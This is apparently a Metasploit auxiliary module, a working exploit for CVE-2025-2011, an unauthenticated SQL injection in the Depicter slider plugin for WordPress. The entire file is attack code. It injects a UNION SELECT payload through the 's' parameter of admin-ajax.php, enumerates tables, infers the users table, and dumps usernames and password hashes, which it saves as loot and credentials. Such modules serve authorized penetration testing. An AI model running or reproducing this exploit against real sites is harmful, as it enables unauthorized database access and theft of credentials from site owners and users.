##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Exploit::Remote::HTTP::Wordpress::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Depicter Plugin SQL Injection (CVE-2025-2011)',
        'Description' => %q{
          The Slider & Popup Builder by Depicter plugin for WordPress <= 3.6.1 is vulnerable to unauthenticated SQL injection via the 's' parameter in admin-ajax.php.
        },
        'Author' => [
          'Muhamad Visat',     # Vulnerability Discovery
          'Valentin Lobstein'  # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-2011'],
          ['WPVDB', '6f894272-3eb6-4595-ae00-1c4b0c0b6564'],
          ['URL', 'https://cloud.projectdiscovery.io/library/CVE-2025-2011'],
          ['URL', 'https://plugins.trac.wordpress.org/browser/depicter/trunk/app/src/Controllers/Ajax/LeadsAjaxController.php?rev=3156664#L179']
        ],
        'Actions' => [['SQLi', { 'Description' => 'Perform SQL Injection via admin-ajax.php?s=' }]],
        'DefaultAction' => 'SQLi',
        'DefaultOptions' => { 'VERBOSE' => true, 'COUNT' => 1 },
        'DisclosureDate' => '2025-05-08',
        'Notes' => { 'Stability' => [CRASH_SAFE], 'SideEffects' => [IOC_IN_LOGS], 'Reliability' => [] }
      )
    )
  end

  def run_host(_ip)
    print_status('Retrieving database name via SQLi...')
    db_name = extract_value_from_sqli('database()')
    fail_with(Failure::UnexpectedReply, 'Failed to extract database name.') unless db_name
    vprint_good("Database name: #{db_name}")

    print_status('Enumerating tables for prefix inference...')
    raw = 'group_concat(table_name) from information_schema.tables where table_schema=database()'
    tables_csv = extract_value_from_sqli(raw)
    fail_with(Failure::UnexpectedReply, 'Failed to enumerate tables.') unless tables_csv
    print_good("Tables: #{tables_csv}")

    visible_tables = tables_csv.split(',')
    prefix = visible_tables.first.split('_').first
    users_table = "#{prefix}_users"
    print_status("Inferred users table: #{users_table}")

    print_status('Extracting user credentials...')
    limit = datastore['COUNT'].to_i
    raw_creds = "group_concat(user_login,0x3a,user_pass SEPARATOR 0x0a) from (select * from #{db_name}.#{users_table} LIMIT #{limit}) as sub"
    creds = extract_value_from_sqli(raw_creds)
    fail_with(Failure::UnexpectedReply, 'Failed to extract credentials.') unless creds

    data = creds.split("\n").map { |u| u.split(':', 2) }
    table = Rex::Text::Table.new(
      'Header' => users_table,
      'Indent' => 4,
      'Columns' => ['Username', 'Password Hash']
    )
    loot_data = ''
    data.each do |user|
      table << user
      loot_data << "Username: #{user[0]}, Password Hash: #{user[1]}\n"
      create_credential(
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user[0],
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
        private_data: user[1],
        service_name: 'WordPress',
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      )
      vprint_good("Created credential for #{user[0]}")
    end

    print_line(table.to_s)
    loot_path = store_loot(
      'wordpress.users',
      'text/plain',
      datastore['RHOST'],
      loot_data,
      'wp_users.txt',
      'WP Usernames and Password Hashes'
    )
    print_good("Loot saved to: #{loot_path}")

    report_host(host: datastore['RHOST'])
    report_service(
      host: datastore['RHOST'],
      port: datastore['RPORT'],
      proto: 'tcp',
      name: fullname,
      info: description.strip
    )
    report_vuln(
      host: datastore['RHOST'],
      port: datastore['RPORT'],
      proto: 'tcp',
      name: fullname,
      refs: references,
      info: description.strip
    )
    vprint_good('Reporting completed')

    data
  end

  def extract_value_from_sqli(expr)
    expr = expr.to_s.strip.gsub(/\s+/, ' ')
    r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
    injected = "#{r1}') UNION SELECT #{r2},#{r3},(SELECT #{expr}),#{r4},#{r5}-- -"

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri('wp-admin', 'admin-ajax.php'),
      'vars_get' => {
        's' => injected,
        'perpage' => rand(10..50).to_s,
        'page' => rand(1..3).to_s,
        'orderBy' => 'source_id',
        'dateEnd' => '',
        'dateStart' => '',
        'order' => ['ASC', 'DESC'].sample,
        'sources' => '',
        'action' => 'depicter-lead-index'
      }
    )
    return unless res&.code == 200

    json = res.get_json_document
    json.dig('hits', 0, 'content', 'id') ||
      json.dig('hits', 0, 'content', 'name')
  end
end
